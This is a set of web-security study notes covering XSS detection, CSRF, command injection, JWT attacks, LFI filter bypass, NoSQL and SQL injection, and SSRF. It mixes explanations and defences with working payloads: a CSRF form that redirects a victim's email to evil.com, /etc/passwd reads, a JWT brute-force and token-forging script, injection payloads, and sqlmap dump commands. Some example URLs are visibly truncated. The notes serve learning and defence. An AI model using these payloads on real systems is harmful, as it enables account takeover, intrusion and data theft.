Blue-Teaming/SOC-Analyst-Notes/XSS-Attac.title: XSS Attack
Blue-Teaming/SOC-Analyst-Notes/XSS-Attac.content:
What is Cross-Site Scripting (XSS)?
Cross-site scripting (XSS) is a type of injection-based web security vulnerability that can be incorporated into legitimate web applications, allowing malicious code to be executed.

Today, most frameworks used to develop web applications have taken preventative measures against cross-site scripting attacks. However, we still see XSS vulnerabilities today because frameworks are sometimes not used, or the framework itself has an XSS vulnerability and the data coming from the user is not sanitized.
Types of XSS
There are 3 types of XSS. These are:


Reflected XSS (Non-Persistent): This is a non-persistent type of XSS where the XSS payload must be present in the request. It is the most common type of XSS.


Stored XSS (Persistent): This type of XSS is where the attacker can permanently upload the XSS payload to the web application. Compared to other types, Stored XSS is the most dangerous type of XSS.


DOM Based XSS: DOM Based XSS is an XSS attack where the attack payload is executed as a result of modifying the DOM “environment” in the victim’s browser used by the original client-side script so that the client-side code runs in an “unexpected” manner. (OWASP)


How does XSS work?
Like other web attack methods, XSS is a vulnerability that is caused by a lack of data sanitization. It occurs when the data received from the user is sent in the response without being sanitized.
Let’s look at an example to understand XSS attacks better.

First, we’ll examine the piece of code above. What it does is actually quite simple. It simply displays whatever is entered in the ‘user’ parameter. If we enter “LetsDefend” as the ‘user’ parameter, we will see the words “Hello LetsDefend”.

So far there is no problem. If we enter the appropriate data in the user parameter, we are greeted with a warm welcome. But, as we have already seen, there is no control mechanism for the user parameter. This means that whatever we put in the “user” parameter will be included in the HTTP response we receive back.
So what would happen if we didn’t enter a normal value, but instead a payload that would trigger a popup?
Payload: alert(1)

Because whatever is put in the ‘user’ parameter is included directly in the HTTP response, the javascript code we wrote worked and a pop-up window appeared on the screen.
This is exactly how XSS works. Because the value entered by the user is not validated, the attacker can enter any javascript code and get the result they want. Another question is, what if the attacker wants to redirect the user to a malicious site?
Payload: window.location=’google.com’
letsdefend.io/xss_example.php%3Cscript%3Ewindow.location=%27google.com%27%3C/script%3E

Of course we are not going to direct you to a web application. Directing you to Google will be sufficient as an example. When the user clicks on the URL he will be directed to Google instead of the perfect LetsDefend web application. 

How Attackers Take Advantage of XSS Attacks
Because XSS is a client-based attack method, it may seem less important than other attack methods, but XSS attacks and their impact should not be taken for granted.
Attackers can do the following with an XSS attack:


Steal a user’s session information


Capture credentials


Etc.


How to Prevent a XSS Vulnerability

Sanitize data coming from a user: Never trust data that you receive from a user. If user data needs to be processed and stored, it should first be encoded with “HTML Encoding” using special characters, only then can it be stored.
Use a framework: Most frameworks come with preventative measures against XSS attacks.
Use the framework correctly: Almost all frameworks used to develop web applications come with a sanitation feature, but if this is not used properly, there is still a chance for XSS vulnerabilities to occur.
Keep your framework up-to-date: Frameworks are developed by humans, so they too can contain XSS vulnerabilities. However, these types of vulnerabilities are usually patched with security updates. You should therefore make sure that you have completed the security updates for your framework on a regular basis.

Detecting XSS Attacks
As XSS is one of the most commonly tested vulnerabilities.

Look for keywords: The easiest way to detect XSS attacks is to look for keywords such as “alert” and “script” that are commonly used in XSS payloads.
Learn about commonly used XSS payloads: Attackers tend to use the same payloads to look for vulnerabilities before exploiting an XSS vulnerability. Therefore, familiarizing yourself with commonly used XSS payloads would make it easier for you to detect XSS vulnerabilities. You can examine some commonly used payloads here.
Check for the use of special characters: Check data coming from a user to see if any special characters commonly used in XSS payloads, such as greater than (>) or less than (<), are present.

An Example of Detection
In this example, we have access logs from an Apache server running WordPress. Don’t forget to revisit our lesson “Detecting SQL injection attacks” for more information about access logs.

Let’s examine the access logs provided.
First, let’s take a general look at the requests that were made and try to understand them. We can see that all the requests were made for the “/blog/” page and that only the “s” parameter values were changed. If you pay attention to the URLs of the websites you visit, you probably have noticed before that when you perform a search in WordPress, the words you enter are sent with the “?s=” parameter. The example we are looking at shows us that these are searches carried out in WordPress.
It is difficult to find examples that are easy to read, such as the example in the lesson ” Detecting SQL Injection Attacks “. Instead, we usually come across characters that have been converted to %XX as a result of URL encoding. We’ll do URL decoding next, but first, let’s look at the URLs and see if we can spot any words.
Looking at the logs, there are javascript-related words such as “script”, “prompt” and “console.log”. The word javascript immediately brings XSS to mind. If we decode the URL, we can easily understand the requests being made.

Let’s take another look at the access logs after decoding the URLs. We can clearly see the XSS payloads and definitely conclude that the WordPress application from which we received these access logs has been the victim of an XSS attack.
When we examine the requested IP addresses, we find that there is more than one. Is there more than one attacker trying to perform an XSS attack at the same time? Or is the attacker constantly changing their IP address to avoid being blocked by security products such as firewalls and IPS? If you check the IP address, you will see that it belongs to Cloudflare. Since WordPress has a partnership with Cloudflare, it is quite normal that Cloudflare would be the source of the request.

Now, if we look at the dates of the requests, we see that a request was made every 3-4 seconds. It is not really possible for a human to try to enter that many XSS payloads in such a short time, but it still doesn’t mean you can be sure that the number of requests made per second is excessive. Because we have the user-agent information in this example, our job is easier. Once we check the information, we see that it belongs to a urllib library. This indicates that these requests were made by an automated vulnerability scanner tool.
So was the attack successful? 
Without access to the responses, we cannot be sure.
As a result of our investigations:

It is clear that the attack was aimed at the web application where the access logs came from.
Looking at the number of requests and the user agent information, we determined that the attack was carried out by an automated vulnerability scanner.
As the application is hosted behind Cloudflare, the source IP addresses were not found.
We do not know if the attack was successful or not.

Blue-Teaming/SOC-Analyst-Notes/fuzzy-has.title: fuzzy hashing
Blue-Teaming/SOC-Analyst-Notes/fuzzy-has.content:
Fuzzy hashing helps us to perform similarity analysis - match two files with minor differences based on the fuzzy hash values.
One of the examples of fuzzy hashing is the usage of SSDeep. SSDEEP creates a hash value that attempts to detect the level of similarity between two files at the binary level. This is different from a cryptographic hash (like SHA1) because a cryptographic hash can check exact matches (or non-matches).

CWSE/CSRF.title: CSRF
CWSE/CSRF.content:
Cross-Site Request Forgery (CSRF)
Introduction
What is Cross-Site Request Forgery (CSRF)?
Cross-Site Request Forgery (CSRF) is a web application vulnerability that tricks an authenticated user into submitting an unwanted command. Also known as “session riding” or a “one-click attack,” CSRF exploits the trust a web application has in a user’s browser.
The attack works by forcing a user’s browser to send a forged request to a site where the user is currently authenticated. This request automatically includes the user’s session credentials (e.g., session cookies), making the server believe it’s a legitimate action initiated by the user. An attacker can leverage this to perform critical actions on the victim’s behalf, such as changing a password, transferring funds, or making a purchase.
The Impact of CSRF Attacks
The severity of a CSRF attack depends on the application’s functionality and the victim’s privilege level. Key impacts include:

Unauthorized Actions: Performing state-changing actions like modifying account details (password, email), posting on social media, or placing orders.
Compromised Data Integrity: Unauthorized modification or deletion of data. If an administrator is targeted, other user accounts could be compromised.
Financial Losses: Initiating fraudulent money transfers or purchases in banking or e-commerce applications.
Account Takeover: Gaining full control of a victim’s account by exploiting password or email change functions.


How CSRF Works
A successful CSRF attack requires three conditions:

A Relevant Action: The application must have a sensitive action (e.g., changing a password) that the attacker wishes to trigger.
Session-Based Authentication: The action must be authenticated solely using session cookies or similar credentials that the browser sends automatically.
The Bait: The attacker must trick the victim’s browser into sending the forged HTTP request to the target server.

sequenceDiagram
    participant User
    participant Attacker's Website
    participant User's Browser
    participant Vulnerable Website

    User->>Vulnerable Website: 1. Logs in, receives session cookie
    activate User's Browser
    Vulnerable Website-->>User's Browser: Session cookie stored

    User->>Attacker's Website: 2. Visits malicious site
    Attacker's Website-->>User's Browser: 3. Serves malicious HTML/JS (e.g., hidden form, img tag)
    User's Browser->>Vulnerable Website: 4. Automatically sends forged request + session cookie
    activate Vulnerable Website
    Vulnerable Website->>Vulnerable Website: 5. Server validates session cookie and processes the malicious request
    Vulnerable Website-->>User's Browser: Response (victim is unaware)
    deactivate Vulnerable Website
    deactivate User's Browser

A diagram illustrating the flow of a CSRF attack.
Example Scenario:

A victim logs into their bank at vulnerable-bank.com. Their browser stores a session cookie for this site.
An attacker crafts a request to transfer money, such as vulnerable-bank.com/transfer
The attacker embeds this request on their own website, attacker-site.com, using a hidden <img> tag.

<!-- HTML code on attacker-site.com -->
<img src="vulnerable-bank.com/transfer width="0" height="0">

The victim, while their banking session is active, visits attacker-site.com.
The victim’s browser sees the <img> tag and automatically sends a GET request to its src URL. Crucially, the browser includes the session cookie for vulnerable-bank.com.
The bank’s server receives the request with a valid session cookie, treats it as a legitimate action, and transfers the money. The victim remains unaware.


Key Concepts





























ConceptDescriptionCookieSmall pieces of data stored in a user’s browser, used by websites to remember sessions and preferences.SessionA server-side mechanism to store user-specific information throughout their interaction with a website.HTTP RequestA call made by a client (like a browser) to a server to request or send data. GET and POST are common methods.Same-Origin Policy (SOP)A browser security mechanism that restricts how a document or script from one origin can interact with a resource from another. SOP restricts reading data across origins but generally does not prevent writing data (e.g., submitting a form), which is what CSRF exploits.PayloadThe forged request crafted by the attacker to be sent by the victim’s browser to the target server.

Detection and Exploitation
Key Indicators of Vulnerability
The primary indicator of a CSRF vulnerability is the absence of a secret, unpredictable token used to verify a request’s authenticity. If a state-changing request relies solely on a session cookie, it is likely vulnerable.
Look for the absence of parameters or headers like these:

Common Token Parameter Names: csrf_token, authenticity_token, __RequestVerificationToken, xsrf_token, nonce.
Common Token Header Names (for AJAX): X-CSRF-Token, X-XSRF-TOKEN.

POST-Based CSRF Exploitation
This is the most common form of CSRF, targeting actions performed via POST requests, typically from form submissions.
Scenario: Changing a user’s email address.
1. Legitimate Request Analysis
A legitimate request to change an email address looks like this:
POST /my-profile/change-email HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=AbC1dE2fGhI3jK4LmN5oPqR6sT7uV8wX
 
email=new.user.email@example.com
Notice there is no unpredictable token, only the session cookie. This is a vulnerability.
2. Preparing the CSRF Payload
The attacker creates a web page with a hidden, auto-submitting form.
<!-- attacker-site.com/csrf.html -->
<html>
  <body>
    <h3>Loading...</h3>
    <form action="vulnerable-site.com/my-profile/change-email" method="POST">
      <input type="hidden" name="email" value="attacker.email@evil.com" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
3. Exploitation and Result

The victim logs into vulnerable-site.com.
The attacker tricks the victim into visiting attacker-site.com/csrf.html.
The JavaScript on the page automatically submits the form. The victim’s browser sends the forged POST request, automatically attaching the valid session cookie.
The server accepts the request and changes the victim’s email, allowing the attacker to initiate a password reset and take over the account.

GET-Based CSRF Exploitation
If a state-changing action is performed via a GET request (a poor design choice), exploitation is even easier.
Scenario: Forcing a user to follow the attacker’s account.
1. Legitimate Request Analysis
A legitimate “follow” action might look like this:
GET /user/follow?user_id=123 HTTP/1.1
Host: vulnerable-social.com
Cookie: session=Z1Y2X3W4V5U6T7S8R9Q0P
2. Preparing the CSRF Payload
The attacker can trigger this request with a simple <img> tag, a link, or other resource-loading tags.
<!-- attacker-site.com/lure.html -->
<html>
  <body>
    <h3>Check out these cool cats!</h3>
    <img src="vulnerable-social.com/user/follow style="display:none;">
  </body>
</html>
Alternatively, the attacker can just send the malicious URL directly to the victim and entice them to click it.
3. Exploitation and Result
When the victim loads the page or clicks the link, their browser sends the GET request with their session cookie, causing them to unknowingly follow the attacker.

Impacts and Payloads
Potential Impacts of CSRF Attacks








































Action TypeExample ScenarioPotential ImpactAccount ManagementChanging a user’s email or password.Complete account takeover.Financial TransactionsTransferring money, buying/selling stocks.Direct financial loss, fraud.E-commerce ActionsAdding items to a cart, placing an order.Unwanted purchases.Social MediaPosting content, sending messages, adding friends.Reputational damage, spreading spam.Privilege EscalationMaking an admin grant privileges to another user.Unauthorized system access.Data ManipulationDeleting a blog post or other user data.Data loss, service disruption.
Basic CSRF Payloads
GET-Based Payloads

























PayloadDescription<a href="...">Click Me!</a>Triggers when the user clicks the link.<img src="...">Triggers automatically when the page loads. Can be hidden.<link rel="stylesheet" href="...">Triggers automatically, pretending to be a CSS file.<script src="..."></script>Triggers automatically, pretending to be a JavaScript file.
POST-Based Payloads

















PayloadDescription<form...><script>document.forms[0].submit();</script>The most common payload. An auto-submitting form.<iframe style="display:none" name="csrf-iframe"></iframe><form target="csrf-iframe">...Submits the form into a hidden iframe to prevent the page from reloading, making the attack stealthier.

Prevention Methods
1. Anti-CSRF Tokens (Synchronizer Token Pattern)
This is the most robust defense. The server generates a unique, unpredictable token for each user session and requires it to be submitted with every state-changing request.
sequenceDiagram
    participant Client
    participant Server

    Client->>Server: 1. Requests a page with a form
    activate Server
    Server->>Server: 2. Generates unique CSRF token
    Server->>Server: 3. Stores token in user's session
    Server-->>Client: 4. Responds with the page, including the token in a hidden form field
    deactivate Server

    Client->>Client: 5. User fills out and submits the form

    Client->>Server: 6. POST request with form data + CSRF token
    activate Server
    Server->>Server: 7. Compares the submitted token with the token stored in the session
    alt Tokens Match
        Server-->>Client: 8. Request is valid, process the action (Success)
    else Tokens Do Not Match
        Server-->>Client: 8. Request is invalid, reject the action (Failure)
    end
    deactivate Server

The workflow of the Anti-CSRF Token (Synchronizer Token) pattern.
Secure Code Example (PHP):
<?php
session_start();
 
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // 1. VALIDATE TOKEN
    if (!isset($_POST['csrf_token']) || !hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
        die('Invalid CSRF Token!');
    }
    // Process the action...
    echo "Email updated successfully!";
    // Regenerate token after use
    unset($_SESSION['csrf_token']);
}
 
// 2. GENERATE TOKEN for the form
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}
?>
 
<!-- Secure Form -->
<form method="POST">
    <label for="email">New Email:</label>
    <input type="email" id="email" name="email">
    <!-- 3. EMBED TOKEN in a hidden field -->
    <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
    <button type="submit">Update</button>
</form>```
 
**Usage in Modern JavaScript Applications (AJAX/SPA):**
For SPAs, the token is often placed in a `<meta>` tag on page load and then attached as a custom HTTP header (`X-CSRF-TOKEN`) to all subsequent AJAX requests.
 
### 2. SameSite Cookie Attribute
This browser-level defense instructs browsers when to send cookies with cross-site requests.
*   `Strict`: The cookie is *only* sent for same-site requests. Most secure, but can break functionality related to external links.
*   `Lax`: A good balance. The cookie is sent on top-level navigation (e.g., clicking a link) but blocked on cross-site subrequests (`POST` forms, `<img>`, `<iframe>`). **This is the default for most modern browsers.**
*   `None`: The cookie is sent with all requests. Requires the `Secure` attribute (HTTPS).
 
**Example Header:**
```http
Set-Cookie: session=AbC1dE2fGh...; SameSite=Lax; HttpOnly; Secure
3. Referer Header Validation
The server can check the Referer header to ensure the request originated from its own domain. However, this is unreliable as a primary defense because the Referer can be suppressed by browsers or proxies for privacy reasons. It should only be used as a secondary check.

Tools and Resources
Automated Scanning and Testing Tools

CWSE/Command-Injection.title: Command Injection
CWSE/Command-Injection.content:
Command Injection is a security vulnerability that allows an attacker to execute arbitrary commands on a host operating system via a vulnerable application. This usually happens when user input is improperly sanitized before being used in system-level commands.

📂 Basics of Command Injection
Example:
# Vulnerable PHP example
<?php
  $file = $_GET['file'];
  system("cat " . $file);
?>
Exploitation:
If user input is not sanitized, an attacker can execute:
?file=/etc/passwd
# Or with multiple commands
?file=/etc/passwd; ls /root
Common Types:


Classic Injection: Directly appending malicious input to a command.


Blind Injection: No output returned; attacker infers results from side effects.


OS Command Injection: Targets the underlying operating system commands.



📂 Bypass Techniques

Some filters block spaces between commands. $IFS (Internal Field Separator) can bypass this.

# Normal Command
ls /etc/passwd
 
# Filtered Command
ls/etc/passwd
 
# Bypass Method
ls${IFS}/etc/passwd

Quotes can bypass filters that block certain keywords.

# Normal Command
whoami
 
# Bypass Using Single Quotes
w'h'o'am'i
 
# Bypass Using Double Quotes
w"h"o"am"i
 
# Bypass Using Backticks
wh``oami

Subcommands can execute special characters.

# Normal Command
whoami
 
# Bypass Using $()
who$()ami
 
# Bypass Using Backticks
who`echo am`i

Chain commands using unfiltered characters.

# Normal Command
google.com && cat /etc/passwd
 
# Filtered Command
google.com cat /etc/passwd
 
# Bypass Using ;
google.com ; cat /etc/passwd
 
# Bypass Using ||
|| cat /etc/passwd

CWSE/JWT-Exploitaion.title: JWT Exploitaion
CWSE/JWT-Exploitaion.content:
JWT Security Vulnerabilities and Attacks
JWTs (JSON Web Tokens) are widely used for authentication and secure data exchange. They allow stateless verification of identity and claims. Despite this, misconfigurations or weak implementation practices can lead to serious security vulnerabilities. This note explores vulnerabilities, attack techniques, and practical exploitation methods, with detailed explanations.

1. JWT Structure and Security Basics
A JWT consists of three parts:
header.payload.signature



Header: Metadata about the token, including the signing algorithm (alg).


Payload: The claims/data the server wants to exchange securely.


Signature: Ensures integrity and authenticity by signing the header and payload.


Security principle: The signature ensures that if someone tampers with the header or payload, verification fails.
Signature creation process (simplified):
1. Encode header and payload in Base64URL
2. Combine: header.payload
3. Sign using secret/private key (HMAC, RSA, etc.)
4. Append signature to form final JWT


2. Signature Verification Flaws
The signature is the most critical part of JWT security. Misconfigured verification can allow attackers to bypass authentication.
2.1 None Algorithm Vulnerability


Why it exists: JWT libraries allow alg: none to indicate an unsigned token. If the server does not reject this, it will accept a token with no signature.


How it works:



Modify JWT header:

{ "alg": "none", "typ": "JWT" }


Remove the signature.


Send token to server → accepted as valid.


Conceptual diagram:
Original JWT: header.payload.signature
Modified JWT: header.payload.
Server accepts token → bypass authentication

Key point: Never trust alg from untrusted clients.

2.2 Weak Signature Keys


Why it’s dangerous: Symmetric algorithms (HS256) use a secret key; if it’s weak (common password, short string), it can be brute-forced.


Exploitation logic: Attackers can try a list of common passwords (dictionary) or all combinations (brute force) until the JWT decodes successfully.


Example attack (dictionary):
import jwt
from jwt.exceptions import InvalidSignatureError
 
jwt_token = "YOUR_JWT_HERE"
with open('dictionary.txt') as f:
for word in f:
	try:
		decoded = jwt.decode(jwt_token, word.strip(), algorithms=['HS256'])
		print(f"Secret found: {word}, Decoded: {decoded}")
		break
	except InvalidSignatureError:
		continue

Lesson: Use long, random keys. Avoid human-readable passwords.


3. Algorithm Confusion Attacks
3.1 Problem


JWT supports multiple algorithms: symmetric (HS256) and asymmetric (RS256).


Vulnerability arises when the server automatically trusts the alg header without enforcing expected algorithm.


Attack logic:


Server expects RS256 (asymmetric) with public key for verification.


Attacker changes alg to HS256 (symmetric).


Uses the server’s public key as the HMAC secret.


Token is accepted without knowing the real private key.


Diagram:
Server expects RS256 verification
Attacker signs HS256 using public key as secret
Server verifies → token accepted

3.2 Exploit Steps
import jwt
 
header = {"alg": "HS256", "typ": "JWT"}
payload = {"sub": "admin"}
token = jwt.encode(payload, "PUBLIC_KEY_AS_SECRET", algorithm="HS256", headers=header)
print(token)

Takeaway: Do not trust alg header from clients. Always enforce the server’s intended algorithm.


4. JWT Header Parameter Vulnerabilities
Certain JWT header parameters are often user-controlled, making them attack vectors.



































ParameterPurposeAttack vectorjwkEmbed public keySelf-signed JWTsjkuURL to key setPoint to attacker-controlled key setkidKey IDFile path traversal or database key injectionctyContent typeExploit XML or serialized object parsingx5cX.509 certificateInject malicious certificates
4.1 JWK Injection


Misconfigured servers accept keys embedded in jwk.


Attacker generates a new RSA key pair, embeds public key in JWT header, signs JWT with private key.


Server validates against embedded public key → accepts malicious token.


4.2 JKU Injection


Server fetches verification keys from URL (jku).


If URL is not validated → attacker hosts malicious keys → server verifies attacker token.


4.3 KID Exploitation


kid tells server which key to use.


Vulnerable implementations allow path traversal:


{ "kid": "../../secret_key_file", "alg": "HS256" }

Server reads arbitrary file → attacker can sign JWT using file content as key.

Lesson: Validate all header parameters and limit sources of verification keys.

5. Replay Attacks


Why: JWTs are stateless → server cannot track usage.


Attack: Capture a valid token and resend multiple times.


Prevention:


Short token lifetimes


Use refresh tokens


Store revoked tokens in database



6. Token Lifetime & Revocation Issues


Problem: Long-lived tokens increase exposure window.


Example: 30-day JWT → compromised token valid for 30 days.


Prevention:


Short lifetimes (minutes to hours)


Refresh tokens with server-side validation


Maintain revocation list



7. JWKS Spoofing


JSON Web Key Sets (JWKS) provide public keys for verification.


Vulnerability: Server blindly trusts keys from public endpoints → attacker can provide forged JWKS → bypass verification.


Prevention: Only trust keys from known endpoints. Validate certificates.



8. Practical Exploit Flow Example
Goal: Gain admin access using JWT header injection


Intercept JWT via proxy (Burp, etc.)


Modify header: alg: HS256


Sign JWT using known or weak key / public key


Optionally inject jwk or kid parameters if server uses dynamic key selection


Send JWT to server → access granted


Flow Diagram:
[Client] → [JWT Interception
		|
		|  Modify Header / Payload
		↓ 
[Attacker signs JWT] → [Server verifies]
		|
		|  Accepts malicious JWT
		↓ 
[Access Admin/Protected Resource]


9. Security Recommendations


Enforce strict algorithm usage (RS256 recommended).


Never accept alg: none.


Use strong, random keys for HMAC.


Validate kid, jku, jwk sources.


Short token lifetimes + refresh tokens.


Implement rate limiting to prevent brute-force attacks.


Audit and log all token verification failures.

CWSE/LFI-Filter-Bypass.title: LFI Filter Bypass
CWSE/LFI-Filter-Bypass.content:
Many web applications implement various protection mechanisms against Local File Inclusion (LFI) vulnerabilities. However, these protections are often insufficient and can be bypassed using various techniques.

1. Path Traversal Filters
Some web applications use simple search-and-replace filters to block path traversal sequences (../).
Example Code Snippet
$language = str_replace('../', '', $_GET['language']);
This code removes ../ sequences, but is inadequate because input is processed only once.
Bypass Example
example.com/index.php



Payload Sent: ....//....//....//....//etc/passwd


After Filtering: ../../../../etc/passwd


Other variations: ..././, ..../

2. Encoding
Filters blocking . and / can be bypassed using URL encoding.
Example
example.com/index.php%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64

This decodes to ../../../../etc/passwd.
Tip: Use online tools for encoding/decoding.

3. Approved Paths
Regex-based filters often restrict input to certain paths.
Example
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Invalid path specified!';
}
Bypass by starting with the approved path and escaping with ../:
example.com/index.php


4. Null Byte Injection
Some apps append .php automatically. In older PHP versions, null byte injection (%00) can bypass this.
Example
example.com/index.php%00

This makes .php ignored.

5. Double Encoding
For stronger filters, use double URL encoding.
Example
example.com/index.php%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%65%74%63%252f%70%61%73%73%77%64

Here %25 = %. After decoding twice → ../../../../etc/passwd.

CWSE/NoSQLi.title: NoSQLi
CWSE/NoSQLi.content:
NoSQL Injection
Overview
NoSQL Injection targets applications that use NoSQL databases. It occurs when untrusted user input is not properly sanitized and is then used to construct database queries. This can lead to authentication bypass, data extraction, modification, or denial of service. Unlike SQL Injection, payloads are highly dependent on the specific NoSQL database technology (e.g., MongoDB, CouchDB).

1. Boolean-Based & Operator Injection
This is the most common form of NoSQL injection. It involves injecting NoSQL query operators to manipulate the logic of a query, often to make a condition universally true.
Common Payloads (MongoDB)
These payloads are often injected into fields like username, password, or URL parameters.
Always True Conditions
Used to bypass authentication or retrieve all records.

$ne (not equal): Bypasses a check by asking if the value is not equal to a random, unlikely value.

{"$ne":null}

$gt (greater than): Checks if a value is greater than an empty string or a low number.

{ "$gt": "" }

$in: Checks if a user’s role is within a list you provide.

{ "$in": ["admin", "user"] }

$nin (not in): Checks if a field is not in the provided (empty) array.

{ "$nin": [] }

$regex: Using a wildcard regex to match any character.

{ "$regex": ".*" }
Example Usage (Password Field)
If an application expects a string for the password, you might send this JSON payload: {"username": "admin", "password": {"$ne": null}}. This changes the query to find a user named “admin” whose password is not null, which is likely true.

2. JavaScript Injection ($where)
Some MongoDB queries may use the $where operator, which can execute server-side JavaScript. This is highly dangerous if an attacker can inject their own code.
Payloads

Always True Condition:

' || '1'=='1
If injected into a string context, this can break out and create a universally true condition.

Authentication Bypass using $where:

{ "$where": "this.username == 'admin'" }

Forcing an Error to Reveal Information:

'); throw 'Error'; (

Introducing a Time Delay (Blind Injection):

'); sleep(5000); (
Example Usage
If the code is db.collection.find({name: ' + userInput + '}), an attacker could provide '; sleep(5000); var a=' as input. The resulting query would be db.collection.find({name: ''; sleep(5000); var a=''}), causing a 5-second delay.

3. Time-Based (Blind) Injection
Used to infer information when the application gives no useful feedback, other than response time. Attackers inject commands that cause a delay if a certain condition is true.
Payloads (MongoDB with JavaScript Injection)
These often require the ability to inject into a JavaScript context like $where.

Conditional Delay: This payload will cause a 5-second delay if the admin user’s password starts with the letter ‘a’. You can then iterate through characters to extract the full password.

{ "$where": "if (this.password.match(/^a.*/)) { sleep(5000) }; return false" }

Login Bypass with Time Delay:

{ "username": "admin", "password": { "$where": "sleep(5000)" } }
If the login process takes 5 seconds longer, you know the username ‘admin’ exists.

4. Array Manipulation
If a query expects an array, an attacker can manipulate it by injecting operators that change how the array is interpreted.
Payloads (MongoDB)
Let’s say a query is looking for users with a specific role: db.users.find({ roles: "user" });

Broadening the Search: An attacker can inject an operator to match multiple roles, including ‘admin’.

{ "$in": ["admin", "user"] }
If submitted as the roles parameter, the query becomes db.users.find({ "roles": { "$in": ["admin", "user"] } });, potentially returning admin users.

Prevention Checklist

Use an ODM/ORM: Object-Document Mappers (like Mongoose for Node.js) have built-in mechanisms to prevent injection by structuring queries safely.
Sanitize and Validate Input: Never trust user input.
Use allow-lists for accepted characters and patterns.
Ensure data types are correct (e.g., if you expect a string, don’t allow an object). This is critical for preventing operator injection.
Disable Server-Side JavaScript: Unless absolutely necessary, disable server-side scripting features (like MongoDB’s $where, mapReduce) if you are not using them.
Principle of Least Privilege: Connect to the database with a user that has the minimum required permissions. The user should not have rights to modify collections or execute administrative commands if it only needs to read data.
Avoid Exposing Raw Queries: Do not build queries by concatenating strings with user input. Use safe, parameterized query methods provided by your database driver.

CWSE/SQLi/Blind-SQLi.title: Blind SQLi
CWSE/SQLi/Blind-SQLi.content:
Blind SQLi Checks
1. Boolean-based

Test with conditions that return TRUE/FALSE:

id=1' AND 1=1-- → page loads normally
id=1' AND 1=2-- → page shows error/different output



2. Time-based

Force delay with database function:

MySQL: id=1' OR SLEEP(5)-- 
If response is delayed → vulnerable



Blind SQLi Exploitation (Effective Payloads)
1. Boolean-Based Payloads

Check DB name length = 5

' AND LENGTH(database())=5-- 

Check first letter of DB = ‘a’

' AND SUBSTRING(database(),1,1)='a'-- 

Check nth character of first table name = ‘u’

' AND SUBSTRING((SELECT table_name 
FROM information_schema.tables LIMIT 0,1),1,1)='u'-- 

If true → page looks normal
If false → page changes / error


2. Time-Based Payloads

Delay if first char of DB = ‘a’

' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)-- 

Delay if first letter of username = ‘a’

' AND IF(ASCII(SUBSTRING((SELECT username 
FROM users LIMIT 0,1),1,1))=97, SLEEP(5), 0)-- 
(97 = ASCII for ‘a’)

If true → response delayed
If false → normal speed


3. Extraction Steps

Find DB length

' AND LENGTH(database())=X-- 


Extract DB name char-by-char with SUBSTRING.


Enumerate tables


' AND IF(ASCII(SUBSTRING((SELECT table_name 
FROM information_schema.tables 
WHERE table_schema=database() LIMIT 0,1),1,1))=116, SLEEP(5), 0)-- 
(116 = ASCII of ‘t’)


Enumerate columns.


Extract row values one character at a time.



4. Automation with sqlmap
# Enumerate databases use threads for faster result
sqlmap -r blind.txt -p search --batch --dbs  -threads 10
 
# Skip sys dbs for faster enumeration 
sqlmap -r blind.txt -p search --batch --dbs  -threads 10 --exclude-sysdb
 
# Get tables
sqlmap -r blind.txt -D target_db --tables
 
# Get columns
sqlmap -r blind.txt -D target_db -T users --columns
 
# Dump data
sqlmap -r blind.txt -D target_db -T users -C username,password --dump

CWSE/SQLi/SQL-UNION-Injection.title: SQL UNION Injection
CWSE/SQLi/SQL-UNION-Injection.content:
Requisite

Both of the queries (original and injected) return same no. of columns and same data type

Identify the no. of columns
For a successful union injection we need to know he no. of columns original query returns. We can do that by injecting order by query until we get an error.
e.g. Lets say we get following results:
' UNION ORDER BY 1-- → 200 OK
' UNION ORDER BY 2-- → 200 OK
' UNION ORDER BY 3-- → 500 Internal Server Error
We can now conclude that the original query returns 2 columns.
We can also try to select columns to learn the no. of columns: ' UNION SELECT NULL, NULL--
Identify the column data type
We may need a column to return string value, so to check if a column supports string/char value we can just try selecting chars as follows: ' UNION SELECT 'a, NULL-- . If we get 200 OK Response then we know that the first columns support character data. We can repeat it for other columns as well.
Payload
After we know the no. of column and data type of the columns. we can now inject our payload and retrieve data as follows:
' UNION SELECT @@version, NULL--
Here, we identified the original query had 2 columns so we also have 2 columns in our payload and both of the columns supported string so we passed our data to first one and passed NULL to the extra column.

CWSE/SSRF.title: SSRF
CWSE/SSRF.content:
Server-Side Request Forgery (SSRF)
Introduction
Server-Side Request Forgery (SSRF) is a web security vulnerability that allows an attacker to induce a server-side application to make HTTP requests to an unintended location. Fundamentally, it occurs when the application server fetches data from a URL or resource that a user can control and fails to properly validate this input.
An attacker can use this vulnerability to make the server send requests to internal network resources that it should not normally have access to (such as databases, administrative panels, other servers), or to the server’s own local file system (localhost).
sequenceDiagram
    participant Attacker
    participant Vulnerable Server
    participant Internal Service
    participant External Service

    Attacker->>Vulnerable Server: Submits malicious URL (e.g., http://internal-service/admin)
    Vulnerable Server-->>Internal Service: Makes request to internal URL
    Internal Service-->>Vulnerable Server: Returns response (e.g., admin panel)
    Vulnerable Server-->>Attacker: Forwards response to attacker

    Attacker->>Vulnerable Server: Submits URL to external site
    Vulnerable Server-->>External Service: Proxies request
    External Service-->>Vulnerable Server: Returns response
    Vulnerable Server-->>Attacker: Forwards response


Why is it Important?
SSRF vulnerabilities are extremely dangerous because they can bypass firewalls, VPNs, and other network segmentation controls by using the server as a proxy. This can grant attackers capabilities such as:

Internal Network Scanning: Attackers can map the internal network topology by scanning for other machines and open ports.
Access to Sensitive Data: Using protocols like file:///, it is possible to access the server’s local files (e.g., /etc/passwd, configuration files). Additionally, in cloud environments (AWS, Azure, Google Cloud), it’s possible to access the metadata services of servers (e.g., http://169.254.169.254/) to steal temporary credentials like access keys and tokens.
Attacking Other Systems: They can exploit other vulnerable services on the internal network (e.g., administrative interfaces, databases) by sending requests to them.
